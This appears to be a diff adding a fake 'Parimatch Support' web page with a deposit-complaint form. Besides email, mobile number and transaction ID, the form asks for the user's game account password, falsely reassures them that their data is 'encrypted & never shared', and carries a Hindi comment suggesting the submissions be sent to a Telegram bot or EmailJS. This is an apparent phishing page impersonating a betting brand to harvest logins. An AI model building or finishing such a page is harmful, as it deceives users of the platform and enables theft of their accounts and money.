@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parimatch Support - Deposit Issue</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0d0e0e;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Header Section */
+        header {
+            width: 100%;
+            background-color: #161818;
+            padding: 15px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-bottom: 1px solid #262929;
+            position: relative;
+        }
+
+        .top-bar {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 0;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background-color: #25291c;
+            color: #f3ff00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            font-size: 16px;
+            border: 1px solid #3c4228;
+            transition: 0.2s;
+        }
+
+        .back-btn:hover {
+            background-color: #353b26;
+        }
+
+        .brand-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-badge {
+            border: 1.5px solid #f3ff00;
+            padding: 5px 12px;
+            border-radius: 8px;
+            font-weight: 900;
+            font-style: italic;
+            color: #f3ff00;
+            letter-spacing: 0.5px;
+            font-size: 14px;
+            background: rgba(243, 255, 0, 0.05);
+        }
+
+        .support-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .tagline {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #9ca3af;
+            letter-spacing: 0.3px;
+        }
+
+        /* Main Form Card */
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px 16px;
+        }
+
+        .complaint-card {
+            background-color: #161818;
+            border: 1px solid #262929;
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 4px;
+        }
+
+        .card-header i {
+            color: #f3ff00;
+            font-size: 20px;
+        }
+
+        .card-header h2 {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .card-subtitle {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-bottom: 18px;
+        }
+
+        .issue-banner {
+            background-color: #f3ff00;
+            color: #000000;
+            text-align: center;
+            font-weight: 700;
+            font-size: 15px;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 22px;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: #e5e7eb;
+            margin-bottom: 8px;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            background-color: #212424;
+            border: 1px solid #323636;
+            border-radius: 10px;
+            padding: 13px 14px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input::placeholder, textarea::placeholder {
+            color: #6b7280;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            border-color: #f3ff00;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11.5px;
+            color: #9ca3af;
+            margin-top: 6px;
+        }
+
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%239ca3af' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            background-size: 16px;
+            cursor: pointer;
+        }
+
+        select option {
+            background-color: #1c1f1f;
+            color: #ffffff;
+            padding: 10px;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 95px;
+            font-family: monospace;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #f3ff00;
+            color: #000000;
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #d9e600;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Header -->
+    <header>
+        <div class="top-bar">
+            <a href="index.html" class="back-btn" title="Back to Home">
+                <i class="fa-solid fa-chevron-left"></i>
+            </a>
+            <div class="brand-box">
+                <div class="logo-badge">PARIMATCH</div>
+                <span class="support-title">Support</span>
+            </div>
+        </div>
+        <div class="tagline">Fast &bull; Secure &bull; Trusted Help</div>
+    </header>
+
+    <!-- Complaint Form Container -->
+    <div class="container">
+        <div class="complaint-card">
+            <div class="card-header">
+                <i class="fa-regular fa-file-lines"></i>
+                <h2>File a Complaint</h2>
+            </div>
+            <p class="card-subtitle">Fill details below for faster resolution</p>
+
+            <div class="issue-banner">Deposit Issue</div>
+
+            <form id="depositForm" onsubmit="handleSubmit(event)">
+                <div class="form-group">
+                    <label for="email">Game Email ID</label>
+                    <input type="email" id="email" placeholder="your@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="mobile">Game Account Mobile No.</label>
+                    <input type="tel" id="mobile" placeholder="+91 XXXXX XXXXX" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Game Account Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                    <div class="security-note">
+                        <i class="fa-solid fa-lock"></i>
+                        <span>Your data is encrypted & never shared</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="status">Select Your Problem Status</label>
+                    <select id="status" required>
+                        <option value="" disabled selected>Select status</option>
+                        <option value="Pending">Pending</option>
+                        <option value="Processing">Processing</option>
+                        <option value="Rejected">Rejected</option>
+                        <option value="Failed">Failed</option>
+                        <option value="Success but not received">Success but not received</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount">Deposit Amount (₹)</label>
+                    <input type="number" id="amount" placeholder="e.g., 500" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="utr">UTR / Transaction ID</label>
+                    <input type="text" id="utr" placeholder="e.g., UTR123456789" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="description">Describe Your Issue</label>
+                    <textarea id="description" placeholder="Explain your problem in detail..." required></textarea>
+                </div>
+
+                <button type="submit" class="submit-btn">Submit Complaint</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            alert("Your Deposit Issue complaint has been submitted successfully!");
+            // Yahan aap apna Telegram Bot / Backend API / EmailJS code laga sakte hain
+        }
+    </script>
+
+</body>
+</html>
